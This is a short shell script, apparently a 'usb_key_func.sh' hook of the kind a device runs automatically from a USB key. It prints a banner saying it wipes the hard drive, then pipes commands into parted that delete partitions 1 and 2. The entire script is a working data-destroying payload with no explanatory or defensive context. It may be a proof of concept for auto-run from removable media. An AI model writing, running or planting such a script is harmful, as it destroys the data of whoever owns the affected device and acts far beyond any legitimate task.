#!/bin/sh


echo "*****************************************************"
echo "Hello from usb_key_func.sh !!! I wipe your hard drive"
echo "*****************************************************"


./parted <<EOF
rm 1
rm 2
quit
EOF

exit 1

